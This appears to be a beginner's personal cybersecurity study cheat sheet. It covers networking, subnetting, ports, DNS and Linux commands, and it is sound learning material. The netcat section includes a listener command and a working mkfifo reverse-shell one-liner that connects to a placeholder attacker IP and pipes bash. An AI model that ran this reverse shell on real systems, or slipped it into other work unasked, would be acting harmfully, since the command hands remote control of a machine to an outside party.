# linux-basic-commands
a basic beginner friendly repo for linux commands for beginners 



# Cybersecurity Learning Notes

Personal cheat sheet — building this as I go through Pre Security / networking / Linux fundamentals.

---

## 📡 Networking

### IP Addressing
| Type | Range | Notes |
|---|---|---|
| Private | `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` | Local network only, not internet-routable |
| Public | ISP-assigned | Unique across the whole internet |

### Subnetting
```
Usable hosts = 2^(host bits) − 2

host bits = 32 − CIDR prefix

Example: /28
32 - 28 = 4 host bits
2^4 = 16 total
16 - 2 = 14 usable
```

| CIDR | Host bits | Total addresses | Usable |
|---|---|---|---|
| /24 | 8 | 256 | 254 |
| /26 | 6 | 64 | 62 |
| /28 | 4 | 16 | 14 |

### TCP vs UDP
- **TCP** — reliable, ordered, handshake-based (web, SSH, file transfer)
- **UDP** — fast, no confirmation (DNS, streaming, gaming)

### TCP 3-Way Handshake
```
You  --SYN-->      Target
You  <--SYN-ACK--  Target
You  --ACK-->      Target
```
- **Open port:** SYN → SYN-ACK
- **Closed port:** SYN → RST
- **Filtered port:** SYN → *(nothing)*

### Common Ports
```
21   FTP     File transfer (unencrypted)
22   SSH     Secure remote login
23   Telnet  Remote login (unencrypted — red flag)
25   SMTP    Sending email
53   DNS     Domain name lookups
80   HTTP    Web (unencrypted)
443  HTTPS   Web (encrypted)
445  SMB     Windows file sharing (common exploit target)
3389 RDP     Windows remote desktop
```

### DNS Record Types
```
A       domain → IPv4
AAAA    domain → IPv6
CNAME   domain → another domain (alias)
MX      domain → mail server
TXT     domain → arbitrary text (verification/security records)
NS      domain → authoritative name servers
```

---

## 🐧 Linux Fundamentals

### File System Map
```
/
├── bin     essential programs
├── etc     config files (/etc/passwd, /etc/shadow — high value targets)
├── home    user folders
├── var     logs, variable data
├── tmp     temp files, wiped on reboot
├── root    root user's home
└── usr     installed programs
```

### Permissions
```
-rwxr-xr--
 owner|group|other

r = 4, w = 2, x = 1
rwx = 7   r-x = 5   r-- = 4

chmod 754 file   → owner:rwx group:r-x other:r--
```
Note: broken permissions on files are a common privilege escalation path.

### Users
- `root` = admin account, full system control
- `sudo command` = run one command as root
- Privesc goal = go from limited user → root

### Essential Commands

**Navigation**
```
pwd            where am I
ls -la         list all files (incl. hidden) with details
cd folder/     change directory
cd ..          go up one level
cd ~           go home
```

**File manipulation**
```
cat file.txt       print file contents
nano file.txt      edit file
cp file1 file2     copy
mv file1 file2     move/rename
rm file            delete (permanent, no trash)
mkdir name         make folder
touch file.txt     create empty file
```

**Searching**
```
find / -name "filename"      search whole system for a file
grep "text" file.txt          search inside a file
grep -r "text" /folder/       search recursively
```

**Process / system info**
```
ps aux         list all running processes
top / htop     live CPU/memory usage
whoami         current user
id             user + group + permissions
```

**Networking**
```
ip a               show interfaces + IPs
ping <ip>          test if host is reachable
netstat -tulnp     show open/listening ports
```

**Permissions**
```
chmod 755 file           set permissions
chown user:group file    change owner
sudo command             run as root
```

---

## 🎯 Netcat / Reverse Shells

### Concept
Normal connection = you connect out to target.
Reverse shell = target connects out to you (bypasses inbound firewall restrictions).

### Listener (attacker side)
```
nc -lvnp 4444
```
- `-l` listen  `-v` verbose  `-n` no DNS resolution  `-p` port

### Target side (Linux, no -e)
Most modern netcat builds don't support `-e` (security reasons). Manual pipe version:
```
mkfifo /tmp/f; nc <your_IP> 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1
```
How it works:
1. `mkfifo` creates a named pipe (a live channel)
2. `nc ... < /tmp/f` sends whatever's in the pipe to you over the network
3. `| /bin/bash` feeds netcat's incoming data (what you type) into bash as commands
4. `> /tmp/f 2>&1` sends bash's output (+errors) back into the pipe → back to you

### Target side (Windows)
No netcat by default — use PowerShell's TCPClient to do the same job (connect out, read input, execute, write output back).

### Reminders
- Reverse shell = the *payload*, not the vulnerability. Need existing foothold first (vuln service, web app flaw, credential access, social engineering).
- IP used = private IP if same network, public IP (+ port forwarding) if remote.
- Traceable by default — real engagements use VPN/VPS, only ever against authorized targets.

---

## 📚 Roadmap

1. **Foundations** — networking ✅, Linux fundamentals ✅, basic scripting (next)
2. **Core security concepts** — how the web works, vuln classes (SQLi, XSS, injection), enumeration tools
3. **Practice** — TryHackMe Pre Security → Complete Beginner → HTB easy boxes
4. **Specialize** — pentesting / OSINT / blue team / AppSec
5. **Certs** — Security+ → eJPT → OSCP (long-term)

---

*Last updated: [11 aug 2026]*
